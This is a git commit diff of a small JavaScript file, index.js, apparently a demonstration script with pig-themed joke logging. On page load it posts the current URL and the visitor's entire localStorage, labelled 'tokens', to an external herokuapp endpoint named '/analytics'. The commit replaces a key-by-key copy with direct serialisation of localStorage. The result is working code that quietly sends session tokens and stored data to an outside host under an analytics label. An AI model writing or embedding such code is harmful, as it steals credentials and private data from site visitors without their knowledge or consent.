d4633cfd3979b0d8cd9bd1ecee91b6152fe25e92
ihollander <ianholla@gmail.com>
2020-05-01 09:25:07 -0400

    stringify localstorage

--- index.js
+++ index.js
@@ -1,17 +1,11 @@
 (() => {
   console.hog = (...args) => console.log("🐷🐷🐷🐷🐷🐷🐷🐷🐷\n", ...args, "\n🐷🐷🐷🐷🐷🐷🐷🐷🐷")
 
-  const hogYourData = Object.keys(localStorage)
-    .reduce((data, key) => {
-      data[key] = localStorage.getItem(key)
-      return data
-    }, {})
-
   fetch("https://aqueous-sea-02063.herokuapp.com/analytics", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ url: window.location.href, tokens: hogYourData })
+    body: JSON.stringify({ url: window.location.href, tokens: localStorage })
   })
 })()
